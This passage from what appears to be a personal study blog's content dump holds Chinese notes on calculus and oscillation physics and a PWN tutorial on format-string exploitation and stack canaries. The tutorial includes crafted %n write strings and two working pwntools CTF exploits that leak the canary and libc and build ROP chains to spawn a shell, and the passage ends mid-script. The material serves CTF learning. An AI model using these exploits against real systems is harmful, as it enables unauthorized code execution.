title="第一类曲线"></a>第一类曲线</h3><h3 id="第一类曲面"><a href="#第一类曲面" class="headerlink" title="第一类曲面"></a>第一类曲面</h3><h3 id="质心"><a href="#质心" class="headerlink" title="质心"></a>质心</h3><h2 id="向量值函数"><a href="#向量值函数" class="headerlink" title="向量值函数"></a>向量值函数</h2><h3 id="第二类曲线"><a href="#第二类曲线" class="headerlink" title="第二类曲线"></a>第二类曲线</h3><h3 id="第二类曲面"><a href="#第二类曲面" class="headerlink" title="第二类曲面"></a>第二类曲面</h3><h3 id="公式-1"><a href="#公式-1" class="headerlink" title="公式"></a>公式</h3><h4 id="格林公式"><a href="#格林公式" class="headerlink" title="格林公式"></a>格林公式</h4><p><strong>第二类曲线积分</strong>与<strong>二重积分</strong><br>$$<br>\iint\limits_D\bigg(\frac{\part{Q}}{\part{x}}-\frac{\part{P}}{\part{y}}\bigg)dxdy&#x3D;\oint_LPdx+Qdy<br>$$</p><p>$$<br>\iint\limits_D\bigg(\frac{\part{Q}}{\part{x}}-\frac{\part{P}}{\part{y}}\bigg)dxdy&#x3D;\oint_{L_1}Pdx+Qdy+\oint_{L_2}Pdx+Qdy<br>$$</p><h4 id="高斯公式"><a href="#高斯公式" class="headerlink" title="高斯公式"></a>高斯公式</h4><p><strong>第二类曲面积分</strong>与<strong>三重积分</strong><br>$$<br>\iiint\limits_V\bigg(\frac{\part{P}}{\part{x}}+\frac{\part{Q}}{\part{y}}+\frac{\part{R}}{\part{z}}\bigg)dV&#x3D;\oiint\limits_SPdydz+Qdzdx+Rdxdy<br>$$</p><h4 id="斯托克斯公式"><a href="#斯托克斯公式" class="headerlink" title="斯托克斯公式"></a>斯托克斯公式</h4><p><strong>空间第二类曲线积分</strong>与<strong>第二类曲面积分</strong><br>$$<br>\oint\limits_LPdx+Qdy+Rdz&#x3D;\iint\limits_S\left |\begin{array}{cccc}<br>dydz &amp;dzdx  &amp;dxdy \<br>\frac{\part}{\part{x}} &amp;\frac{\part}{\part{y}}&amp;\frac{\part}{\part{z}}  \<br>P &amp; Q &amp;R \<br>\end{array}\right|<br>$$</p><h3 id="路径无关"><a href="#路径无关" class="headerlink" title="路径无关"></a>路径无关</h3><h1 id="无穷级数"><a href="#无穷级数" class="headerlink" title="无穷级数"></a>无穷级数</h1><h2 id="常用级数"><a href="#常用级数" class="headerlink" title="常用级数"></a>常用级数</h2><p>几何级数：<br>$$<br>\sum_{n&#x3D;0}^{\infty}aq^n&#x3D;\left{<br>\begin{aligned}<br>\frac{a}{1-q} &amp; , &amp; |q|&lt;1, \<br>发散 &amp; , &amp; |q|&gt;1<br>\end{aligned}<br>\right.<br>$$<br>调和级数</p><p>P级数<br>$$<br>\sum_{n&#x3D;1}^{\infty}(-1)^n\frac{1}{n^p}&#x3D;\left{<br>\begin{aligned}<br>发散 &amp; , &amp; p\leq 0, \<br>条件收敛 &amp; , &amp; 0&lt;p\leq 1, \<br>绝对收敛 &amp; , &amp; p&gt;1<br>\end{aligned}<br>\right.<br>$$</p><h2 id="常数项级数判别"><a href="#常数项级数判别" class="headerlink" title="常数项级数判别"></a>常数项级数判别</h2><h3 id="正数项"><a href="#正数项" class="headerlink" title="正数项"></a>正数项</h3><h4 id="比较判敛法"><a href="#比较判敛法" class="headerlink" title="比较判敛法"></a>比较判敛法</h4><p>n&gt;N,k</p><p>比值为正数</p><h4 id="比值判敛法"><a href="#比值判敛法" class="headerlink" title="比值判敛法"></a>比值判敛法</h4><p>达朗贝尔</p><h4 id="根值判敛法"><a href="#根值判敛法" class="headerlink" title="根值判敛法"></a>根值判敛法</h4><p>柯西</p><h3 id="交错项"><a href="#交错项" class="headerlink" title="交错项"></a>交错项</h3><h4 id="莱布尼兹"><a href="#莱布尼兹" class="headerlink" title="莱布尼兹"></a>莱布尼兹</h4>]]></content>
      
      
      <categories>
          
          <category> 数理笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> caculus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MK_Physics</title>
      <link href="/MK-Physics/"/>
      <url>/MK-Physics/</url>
      
        <content type="html"><![CDATA[<h1 id="振动-波"><a href="#振动-波" class="headerlink" title="振动&amp;波"></a>振动&amp;波</h1><h2 id="简谐振动"><a href="#简谐振动" class="headerlink" title="简谐振动"></a>简谐振动</h2><h3 id="简谐振动的速度、加速度"><a href="#简谐振动的速度、加速度" class="headerlink" title="简谐振动的速度、加速度"></a>简谐振动的速度、加速度</h3><p>$$<br>x&#x3D;Acos(\omega t+\varphi)\\<br> v&#x3D;-\omega A sin(\omega t+\varphi)\\<br> a&#x3D;-\omega ^2 A cos(\omega t+\varphi)\\<br> 运动学特性:a&#x3D;-\omega ^2 x\\<br> 动力学特性:F&#x3D;ma&#x3D;-m\omega ^2x&#x3D;-kx\\<br> 等效劲度系数:k&#x3D;m\omega^2<br>$$</p><h3 id="简谐振动的能量"><a href="#简谐振动的能量" class="headerlink" title="简谐振动的能量"></a>简谐振动的能量</h3><h4 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h4><p>$$<br>(瞬时)振动势能:E_p&#x3D;\frac{1}{2}kx^2&#x3D;\frac{1}{2}kA^2cos^2(\omega t+\varphi)\\<br> (瞬时)振动动能:E_k&#x3D;\frac{1}{2}mv^2&#x3D;\frac{1}{2}m\omega^2 A^2 sin^2(\omega t+\varphi)\\<br> E&#x3D;E_p+E_k&#x3D;\frac{1}{2}kA^2\\<br> 平均能量:\overline{E}_p&#x3D;\overline{E}_k&#x3D;\frac{1}{4}kA^2<br>$$</p><p>p.s.振动势能和弹性势能一般<strong>不相同</strong></p><h4 id="证明简谐运动"><a href="#证明简谐运动" class="headerlink" title="证明简谐运动"></a>证明简谐运动</h4><p>由于对下式求导：<br>$$<br>E&#x3D;E_p+E_k&#x3D;C<br>$$<br>可得：<br>$$<br>w^2&#x3D;\frac{k}{m}<br>$$</p><p>故可先写出振动体系能量关系，若能量守恒，就可求导得出谐振子动力学方程，多用于非机械振动</p><h3 id="简谐振动的运动学描述"><a href="#简谐振动的运动学描述" class="headerlink" title="简谐振动的运动学描述"></a>简谐振动的运动学描述</h3><h4 id="解析法"><a href="#解析法" class="headerlink" title="解析法"></a>解析法</h4><p>$$<br>w&#x3D;\sqrt{\frac{k}{m}}\<br> A&#x3D;\sqrt{x^2+\frac{v^2}{w^2}}\<br> tg\varphi&#x3D;-\frac{v_0}{wx_0}<br>$$</p><h4 id="旋转矢量法"><a href="#旋转矢量法" class="headerlink" title="旋转矢量法"></a>旋转矢量法</h4><h4 id="曲线法"><a href="#曲线法" class="headerlink" title="曲线法"></a>曲线法</h4><h3 id="简谐振动的合成"><a href="#简谐振动的合成" class="headerlink" title="简谐振动的合成"></a>简谐振动的合成</h3><h4 id="同频率平行"><a href="#同频率平行" class="headerlink" title="同频率平行"></a>同频率平行</h4><p>$$<br>x_1&#x3D;A_1cos(\omega t+\varphi_1)\\<br> x_2&#x3D;A_2cos(\omega t+\varphi_2)\\<br> x&#x3D;x_1+x_2&#x3D;x_1&#x3D;Acos(\omega t+\varphi)\<br>$$</p><p>由<strong>旋转矢量法</strong>求得：</p><p>$$<br>A&#x3D; \sqrt{A_1^2+A_2^2+2A_1A_2\cos(\varphi_2-\varphi_1)}\\<br> tg\varphi&#x3D;\frac{A_1\sin\varphi_1+A_2\sin \varphi_2}{A_1\cos\varphi_1+A_2\cos\varphi_2}\<br>$$</p><h4 id="不同频率平行"><a href="#不同频率平行" class="headerlink" title="不同频率平行"></a>不同频率平行</h4><p>$$<br>x_1&#x3D;A\cos(\omega_1 t+\varphi)\\<br> x_2&#x3D;A\cos(\omega_2 t+\varphi)\\<br> x&#x3D;x_1+x_2&#x3D;2A\cos\frac{\omega_2-\omega_1}{2}t\cos(\frac{\omega_1+\omega_2}{2}t+\varphi)<br>$$</p><p>当$$ \omega_1 $$和$$ \omega_2 $$都较大且相差很小时，$$ \cos\frac{\omega_2-\omega_1}{2}t $$ 的周期比$$ cos(\frac{\omega_1+\omega_2}{2}t+\varphi) $$ 长得多，前者频率为<strong>调制频率</strong>，后者频率为<strong>载频</strong></p><h4 id="垂直"><a href="#垂直" class="headerlink" title="垂直"></a>垂直</h4><h5 id="同频率"><a href="#同频率" class="headerlink" title="同频率"></a>同频率</h5><p>$$<br>x&#x3D;A_1\cos(\omega t+\varphi_1)\\<br> y&#x3D;A_2\cos(\omega t+\varphi_2)\\<br> \frac{x^2}{A_1^2}+\frac{y^2}{A_2^2}-2\frac{x}{A_1}\frac{y}{A_2}\cos(\varphi_2-\varphi_1)&#x3D;\sin^2(\varphi_2-\varphi_1)<br>$$</p><ol><li>一般为椭圆，形状由$$ \Delta \varphi $$决定</li><li>$$ \Delta \varphi&#x3D;2k\pi $$时，为直线，合振动<strong>为简谐振动</strong></li><li>$$ \Delta \varphi&#x3D;\pm\frac{\pi}{2} $$时，为椭圆，合振动<strong>不为简谐振动</strong>，正为顺时针</li></ol><h5 id="不同频率"><a href="#不同频率" class="headerlink" title="不同频率"></a>不同频率</h5><p>若频率有简单倍数关系，形成<strong>李萨如图形</strong></p><h2 id="波"><a href="#波" class="headerlink" title="波"></a>波</h2><h3 id="描述量"><a href="#描述量" class="headerlink" title="描述量"></a>描述量</h3><p><strong>波速</strong>（相速）：<br>$$<br>u&#x3D;\sqrt{\frac{B}{\rho}},\ \ B为弹性模量\ \rho为质量密度（惯性）<br>$$<br>机械波波速取决于<strong>介质本身的性质</strong>，与波源振动的频率无关</p><h3 id="波动方程"><a href="#波动方程" class="headerlink" title="波动方程"></a>波动方程</h3><p>$$<br>y&#x3D;A\cos[\omega(t\mp \frac{x}{u})+\varphi_0]<br>$$</p><h3 id="动力学方程"><a href="#动力学方程" class="headerlink" title="动力学方程"></a>动力学方程</h3><p>将运动学方程中$y$对$t$，$x$求二阶偏导<br>$$<br>\frac{\partial^2{y}}{\partial{x}^2}&#x3D;\frac{1}{u}\frac{\partial^2y}{\partial{t}^2}<br>$$</p><h3 id="波的能流和强度"><a href="#波的能流和强度" class="headerlink" title="波的能流和强度"></a>波的能流和强度</h3><h4 id="波的能量"><a href="#波的能量" class="headerlink" title="波的能量"></a>波的能量</h4><p>$$<br>质元动能:\mathrm{d}E_k&#x3D;\frac{1}{2}(\rho\mathrm{d}V)\omega^2A^2\sin^2[\omega(t-\frac{x}{u})]\\<br> 质元弹性势能:\mathrm{d}E_p&#x3D;\frac{1}{2}(\rho\mathrm{d}V)\omega^2A^2\sin^2[\omega(t-\frac{x}{u})]\\<br> 质元能量:\mathrm{d}E&#x3D;(\rho\mathrm{d}V)\omega^2A^2\sin^2[\omega(t-\frac{x}{u})]\\<br> 能量密度:w(x)&#x3D;\frac{\mathrm{d}E}{\mathrm{d}V}&#x3D;\rho\omega^2A^2\sin^2[\omega(t-\frac{x}{u})]\\<br> 平均能量密度:\overline{w}(x)&#x3D;\frac{1}{T}\int ^T _0\rho\omega^2A^2\sin^2[\omega(t-\frac{x}{u})]\mathrm{d}t&#x3D;\frac{1}{2}\rho\omega^2A^2<br>$$<br>质元的机械能不是常量，随时间周期性变化，但能量密度在一个周期内平均值是常量</p><h4 id="波的能流和能流密度"><a href="#波的能流和能流密度" class="headerlink" title="波的能流和能流密度"></a>波的能流和能流密度</h4><p>$$<br>能流:P&#x3D;wuS&#x3D;\frac{\mathrm{d}E}{\mathrm{d}V}&#x3D;\rho\omega^2A^2\sin^2[\omega(t-\frac{x}{u})]uS\\<br> 平均能流:\overline{P}&#x3D;\overline{w}uS&#x3D;\frac{1}{2}\rho\omega^2A^2uS\\<br> 平均能流密度(波强):I&#x3D;\frac{\overline{P}}{S}&#x3D;\frac{1}{2}\rho\omega^2A^2u<br>$$</p><h3 id="波的叠加和干涉"><a href="#波的叠加和干涉" class="headerlink" title="波的叠加和干涉"></a>波的叠加和干涉</h3><p>$$<br>\Delta\varphi&#x3D;\varphi_2-\varphi_1-\frac{2\pi}{\lambda}(r_2-r_1)<br>$$<br>为$ 2k\pi $时加强，$ (2k+1)\pi $时减弱</p><h3 id="驻波"><a href="#驻波" class="headerlink" title="驻波"></a>驻波</h3><h4 id="半波损失"><a href="#半波损失" class="headerlink" title="半波损失"></a>半波损失</h4>]]></content>
      
      
      <categories>
          
          <category> 数理笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Physics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN从入门到出入平安（一）——格式化字符与Canary</title>
      <link href="/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%8ECanary/"/>
      <url>/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%8ECanary/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写的很乱，日后再改</p></blockquote><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="格式化输出函数"><a href="#格式化输出函数" class="headerlink" title="格式化输出函数"></a>格式化输出函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fprintf</span><span class="params">(FILE *stream, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">snprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure><h4 id="占位符语法"><a href="#占位符语法" class="headerlink" title="占位符语法"></a>占位符语法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure><h6 id="parameter"><a href="#parameter" class="headerlink" title="parameter"></a>parameter</h6><p>n$：第几个参数</p><h6 id="type"><a href="#type" class="headerlink" title="type"></a>type</h6><p>X：Hex</p><p>p：void*指针型值</p><p>n：把已经成功输出的字符个数写入对应整型指针参数所指变量</p><p>%n     一次性写入 4 个字节</p><p>%hn     一次性写入 2 个字节</p><p>%hhn    一次性写入 1 个字节</p><p>%lln 8</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>第几个参数可以通过gdb的fmtarg功能查找</p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%8ECanary.assets/image-20230522230246834.png" alt="image-20230522230246834"></p><blockquote><p>懒狗是这样的，直接截</p></blockquote><h4 id="泄露栈上数据"><a href="#泄露栈上数据" class="headerlink" title="泄露栈上数据"></a>泄露栈上数据</h4><p><code>%X$p</code> <code>%X$x</code> <code>%08x</code> 可泄露栈上数据，可用于泄露canary</p><p>也可先在栈上写上需要的数据，再利用进行任意内存写，如<code>%Yc%X$n</code> </p><h3 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h3><p>libcmain地址会在调用main时存入</p><h4 id="泄露栈上地址指向的数据"><a href="#泄露栈上地址指向的数据" class="headerlink" title="泄露栈上地址指向的数据"></a>泄露栈上地址指向的数据</h4><p><code> %s</code> 显示地址指向的ascll，可用于got表泄露</p><h4 id="覆盖栈上任意地址"><a href="#覆盖栈上任意地址" class="headerlink" title="覆盖栈上任意地址"></a>覆盖栈上任意地址</h4><h6 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h6><p>尝试将 <code>arg2</code> 的值更改为任意值 （ 比如 <code>0x00000020</code> ，十进制 32 ）在gdb中可以看到得到<code>arg2</code>的地址<code>0xffffd538</code>， 那么我们构造格式字符串<code>\x38\xd5\xff\xff%08x%08x%012d%13$n</code> ， 且中 <code>\x38\xd5\xff\xff</code> 表示 <code>arg2</code> 的地址，占 4 字节，<code>％08x％08X</code> 表示两个 8 字符宽的十六进制数 ， 占 16 字节 ，<code>％012d</code> 占 12 字节 ， 三个部分加起来就占了4 + 16 + 12 &#x3D; 32 字节 ， 即把 arg2 赋值为 <code>0x00000020</code>。 格式字符串最后一部分<code>％13$n</code>也是最重要的一部分，和上面的内容一样 ， 表示格式字符串的第 13 个参数 ， 即写入 <code>0xffffd538</code> 的地方（ <code>0xffffd564 </code>）<code>printf()</code> 就是通过这个地址找到被覆盖的内容的 </p><p><code>printf</code> 首先解析 <code>％13$</code> 找到获得地址<code>0xffffd564</code> 的值<code>0xffffd538</code>， 然后跳转到地址 <code>0xffffd538</code>， 将它的值 <code>0X88888888</code> 覆盖为 <code>20</code> ， 就得到<code>arg2 = 0x00000020 </code></p><h3 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h3><table><thead><tr><th align="right">High address</th><th align="center"></th></tr></thead><tbody><tr><td align="right"></td><td align="center">args</td></tr><tr><td align="right"></td><td align="center">return address</td></tr><tr><td align="right">rbp</td><td align="center">old ebp</td></tr><tr><td align="right">rbp - 8</td><td align="center">canary value</td></tr><tr><td align="right"></td><td align="center">local variable</td></tr><tr><td align="right">Low address</td><td align="center"></td></tr></tbody></table><h3 id="水水实例"><a href="#水水实例" class="headerlink" title="水水实例"></a>水水实例</h3><p>某某杯payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&quot;./pwn1&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;172.51.228.233&quot;</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;thing\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;tricks\n0x&#x27;</span>)</span><br><span class="line">base=<span class="built_in">int</span>(p.recvn(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">backdoor=base-<span class="number">0x94</span></span><br><span class="line">binsh=base+<span class="number">0x202068</span>-<span class="number">0xa94</span></span><br><span class="line">gadgets=base+<span class="number">0xc73</span>-<span class="number">0xa94</span></span><br><span class="line">gadgets2=base+<span class="number">0x821</span>-<span class="number">0xa94</span></span><br><span class="line">sys=base+<span class="number">0x870</span>-<span class="number">0xa94</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;hello\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%33$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recvn(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">25</span>*<span class="number">8</span>+p64(canary)+<span class="string">b&quot;A&quot;</span>*<span class="number">8</span>+p64(gadgets)+p64(binsh)+p64(gadgets2)+p64(sys)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload"></a>fmtstr_payload</h2><p>fmtstr_payload(offset, writes, numbwritten&#x3D;0, write_size&#x3D;’byte’)<br>第一个参数表示格式化字符串的偏移；<br>第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT: systemAddress}；本题是将0804a048处改为0x2223322<br>第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；<br>第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。<br>fmtstr_payload函数返回的就是payload</p><p>实际上我们常用的形式是fmtstr_payload(offset,{address1:value1})</p><h2 id="进阶操作"><a href="#进阶操作" class="headerlink" title="进阶操作"></a>进阶操作</h2><p>读入函数不保存在栈上，无法直接修改地址的情况</p><p>通过利用栈上已有的地址，向已有的地址写入想修改的地址，然后再将修改后的地址作为参数</p><p>例：dasctf2023bin专项，fooooood（wp转载）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># 1-&gt;11 2-&gt;37</span></span><br><span class="line"><span class="comment"># 1-&gt;25 2-&gt;39</span></span><br><span class="line"><span class="comment"># 覆盖变量i为40</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>);</span><br><span class="line">payload=<span class="string">b&#x27;%11$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;like &#x27;</span>)</span><br><span class="line">rsp=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;!?&#x27;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)-<span class="number">248</span></span><br><span class="line">i=rsp+<span class="number">4</span></span><br><span class="line">i_off=i&amp;<span class="number">0xffff</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(i_off).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">40</span>).encode()+<span class="string">b&#x27;c%37$hhn&#x27;</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line"><span class="comment">#泄露libc_base</span></span><br><span class="line">payload=<span class="string">b&#x27;%9$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;like &#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;!?&#x27;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)-<span class="number">240</span>-libc.sym.__libc_start_main<span class="comment">#简单的格式化字符串利用函数，将dest地址的后8字节循环更改成ptr对应的字节，off1与off2为上述</span></span><br><span class="line">（<span class="number">1</span>）与（<span class="number">2</span>）两个栈地址在格式化字符串中的偏移</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overlap</span>(<span class="params">dest,ptr,off1,off2</span>):</span><br><span class="line">d=dest&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ptr:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(d).encode()+<span class="string">b&#x27;c%&#x27;</span>+<span class="built_in">str</span>(off1).encode()+<span class="string">b&#x27;$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line">f=ptr&amp;<span class="number">0xff</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(f).encode()+<span class="string">b&#x27;c%&#x27;</span>+<span class="built_in">str</span>(off2).encode()+<span class="string">b&#x27;$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line">d+=<span class="number">1</span></span><br><span class="line">ptr&gt;&gt;=<span class="number">8</span></span><br><span class="line">ret=rsp+<span class="number">0x18</span></span><br><span class="line">ptr=libc.address+<span class="number">0x21112</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym.system))</span><br><span class="line"><span class="comment">#通过将第25个参数传入格式化字符串，将第39个参数的值改为返回地址</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(ret&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%&#x27;</span>+<span class="built_in">str</span>(<span class="number">25</span>).encode()+<span class="string">b&#x27;$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line"><span class="comment">#覆盖返回地址为ptr（pop_rdi; ret）</span></span><br><span class="line">overlap(ret,ptr,<span class="number">25</span>,<span class="number">39</span>)</span><br><span class="line"><span class="comment">#覆盖返回地址+8的位置为binsh字符串地址</span></span><br><span class="line">overlap(ret+<span class="number">8</span>,libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__(),<span class="number">25</span>,<span class="number">39</span>)</span><br><span class="line"><span class="comment">#覆盖返回地址+16的位置为system函数的地址</span></span><br><span class="line">overlap(ret+<span class="number">16</span>,libc.sym.system,<span class="number">25</span>,<span class="number">39</span>)</span><br><span class="line"><span class="comment">#至此，退出循环执行ROP后即可获取系统操作权限</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#简单的格式化字符串利用函数，将dest地址的后8字节循环更改成ptr对应的字节，off1与off2为上述</span></span><br><span class="line">（<span class="number">1</span>）与（<span class="number">2</span>）两个栈地址在格式化字符串中的偏移</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overlap</span>(<span class="params">dest,ptr,off1,off2</span>):</span><br><span class="line">d=dest&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ptr:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">payload=<span 